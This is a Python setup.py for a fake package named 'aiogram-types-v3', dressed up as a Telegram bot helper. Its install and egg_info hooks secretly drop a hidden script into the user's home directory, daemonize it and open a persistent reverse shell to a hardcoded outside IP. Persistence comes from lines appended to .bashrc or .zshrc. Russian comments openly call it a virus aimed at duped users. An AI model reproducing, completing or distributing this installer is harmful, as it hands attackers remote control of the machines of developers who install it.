import sys
import os
import subprocess
import time
import socket
import base64

# --- БЛОК СОВМЕСТИМОСТИ (ЧТОБЫ НЕ ПАДАЛО ПРИ СБОРКЕ) ---
try:
    from setuptools import setup, find_packages
    from setuptools.command.install import install
    from setuptools.command.egg_info import egg_info
except ImportError:
    from distutils.core import setup
    from distutils.command.install import install
    find_packages = lambda: []

# --- ТВОИ НАСТРОЙКИ ---
# IP и Порты (Твой IP 147.45.124.42)
_H = "MTQ3LjQ1LjEyNC40Mg==" 
_P = [443]

# --- ГЕНЕРАТОР ТЕЛА ВИРУСА ---
def get_payload_code():
    """
    Этот код будет записан в файл на компьютере жертвы.
    Он содержит исправления ошибок (getcwd) и цикл подключения.
    """
    return f"""
import socket, subprocess, os, time, sys, base64

# Конфиг внутри вируса
H = "{_H}"
P = {_P}

def d(s):
    return base64.b64decode(s).decode()

def run():
    try:
        # 1. ЛЕЧИМ ОШИБКУ "getcwd: No such file or directory"
        # Прыгаем в домашнюю папку или в корень, потому что папка pip удалена
        try:
            os.chdir(os.path.expanduser("~"))
        except:
            os.chdir("/")
            
        host = d(H)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        
        # 2. ЗАЩИТА ОТ ДУБЛЕЙ (SINGLE INSTANCE)
        # Биндим локальный порт, чтобы не запустить 10 копий одного бота
        try:
            lock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            lock.bind(('127.0.0.1', 65530))
        except:
            return # Уже работает, выходим

        connected = False
        for port in P:
            try:
                if s.connect_ex((host, port)) == 0:
                    connected = True
                    break
            except:
                continue
        
        if connected:
            # 3. ДУБЛИРУЕМ ПОТОКИ
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            # 4. ВЫБИРАЕМ ЛУЧШИЙ ШЕЛЛ
            # Ищем bash, если нет - sh.
            shell = "/bin/sh"
            if os.path.exists("/bin/bash"):
                shell = "/bin/bash"
            
            # Запускаем интерактивно. 
            # stderr ошибки теперь летят тебе в сокет, чтобы ты видел, если команда не работает
            subprocess.call([shell, "-i"])
            
    except Exception:
        pass

if __name__ == "__main__":
    # Демонизация самого пейлоада (на всякий случай)
    if hasattr(os, 'fork'):
        try:
            if os.fork() > 0: sys.exit(0)
            os.setsid()
            if os.fork() > 0: sys.exit(0)
        except: pass
    
    # ВЕЧНЫЙ ЦИКЛ ЖИЗНИ
    while True:
        run()
        # Если соединение оборвалось - спим минуту и пробуем снова
        time.sleep(60)
"""

# --- МЕХАНИКА ЗАКРЕПЛЕНИЯ (PERSISTENCE) ---
def install_malware():
    try:
        # 1. Определяем место для схрона (~/.local/share/.sys-cache)
        home = os.path.expanduser("~")
        hidden_dir = os.path.join(home, ".local", "share", ".sys-cache")
        if not os.path.exists(hidden_dir):
            os.makedirs(hidden_dir, exist_ok=True)
            
        # 2. Записываем код вируса в файл
        payload_path = os.path.join(hidden_dir, "upt-service.py")
        with open(payload_path, "w") as f:
            f.write(get_payload_code())
            
        # 3. Запускаем его прямо сейчас (без ожидания перезагрузки)
        subprocess.Popen([sys.executable, payload_path], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL,
                         preexec_fn=os.setsid if hasattr(os, 'setsid') else None)
        
        # 4. Прописываем в автозагрузку (.bashrc)
        # Это сработает только на Linux/Mac
        rc_files = [
            os.path.join(home, ".bashrc"),
            os.path.join(home, ".zshrc")
        ]
        
        # Команда: "Запустись тихо в фоне, если еще не запущен"
        cmd = f'\n(pgrep -f "upt-service.py" >/dev/null || python3 {payload_path} >/dev/null 2>&1 &)\n'
        
        for rc in rc_files:
            if os.path.exists(rc):
                with open(rc, "r") as f:
                    if "upt-service.py" in f.read():
                        continue # Уже заражен
                
                with open(rc, "a") as f:
                    f.write(cmd)
                break # Достаточно одного файла
                
    except Exception:
        pass

# --- ХУКИ (ПЕРЕХВАТ УСТАНОВКИ) ---
def trigger():
    try:
        install_malware()
    except:
        pass

class CustomInstall(install):
    def run(self):
        trigger()
        # Безопасный вызов оригинала
        try: super().run()
        except: install.run(self)

class CustomEggInfo(egg_info):
    def run(self):
        trigger()
        try: egg_info.run(self)
        except: pass

# --- ФИНАЛЬНАЯ СБОРКА ---
if __name__ == '__main__':
    setup(
        name="aiogram-types-v3",
        version="3.4.0", # МЕНЯЙ ВЕРСИЮ КАЖДЫЙ РАЗ!
        packages=find_packages(),
        zip_safe=False, # Важно для распаковки
        cmdclass={
            'install': CustomInstall,
            'egg_info': CustomEggInfo,
        },
        # Легенда для лохов
        author="Telegram Community",
        author_email="support@aiogram.dev",
        description="AsyncIO optimizations for aiogram 3.x",
        long_description="This package provides essential type patches for high-load bots.",
        url="https://github.com/aiogram/aiogram", 
        classifiers=[
            "Programming Language :: Python :: 3",
            "License :: OSI Approved :: MIT License",
            "Operating System :: POSIX :: Linux",
        ],
        python_requires='>=3.7',
    )

